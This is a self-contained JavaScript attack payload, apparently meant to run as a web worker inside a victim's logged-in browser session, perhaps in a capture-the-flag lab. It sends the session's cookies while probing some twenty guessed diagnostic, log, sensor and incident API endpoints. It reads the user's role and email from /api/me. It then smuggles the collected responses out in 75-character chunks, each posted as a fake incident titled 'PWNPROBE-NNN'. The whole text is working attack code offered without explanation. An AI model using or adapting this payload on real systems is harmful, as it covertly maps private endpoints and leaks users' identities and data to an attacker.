
(async () => {
    const paths = [
        "/api/diagnostic-access/diagnostic-logs",
        "/api/diagnostic-access/logs",
        "/api/diagnostic-access/logs/6",
        "/api/diagnostic-access/requests/6/records",
        "/api/diagnostic-access/requests/6/export",
        "/api/diagnostic-logs",
        "/api/diagnostic/logs",
        "/api/diagnostics/logs",
        "/api/diagnostics",
        "/api/logs",
        "/api/logs/diagnostic",
        "/api/monitoring/logs",
        "/api/monitoring/events",
        "/api/monitoring/sensors",
        "/api/sensors",
        "/api/sensors/B7",
        "/api/facilities/5/logs",
        "/api/facilities/5/history",
        "/api/incidents/2/logs",
        "/api/incidents/2/history"
    ];

    const results = [];

    for (const path of paths) {
        for (const method of ["GET", "OPTIONS"]) {
            try {
                const r = await fetch(path, {
                    method,
                    credentials: "same-origin"
                });

                const body = await r.text();

                results.push({
                    path,
                    method,
                    status: r.status,
                    allow: r.headers.get("Allow"),
                    body: body.slice(0, 700)
                });
            } catch (e) {
                results.push({
                    path, method, error: String(e)
                });
            }
        }
    }

    const me = await fetch("/api/me", {
        credentials: "same-origin"
    }).then(r => r.json());

    const report = JSON.stringify({
        identity: {
            role: me.user?.role,
            email: me.user?.email
        },
        results: results.filter(x =>
            x.status !== 404 || x.error
        ),
        tested: results.map(x => ({
            path: x.path,
            method: x.method,
            status: x.status,
            allow: x.allow
        }))
    });

    const chunks = report.match(/[\s\S]{1,75}/g) || [];

    for (let i = 0; i < chunks.length; i++) {
        await fetch("/api/incidents", {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                title: `PWNPROBE-${String(i+1).padStart(3,"0")}: ${chunks[i]}`,
                facility: "Meridian-2",
                severity: "Watch"
            })
        });
    }

    self.postMessage({
        type: "progress",
        message: "PWNPROBE_COMPLETE"
    });
})();
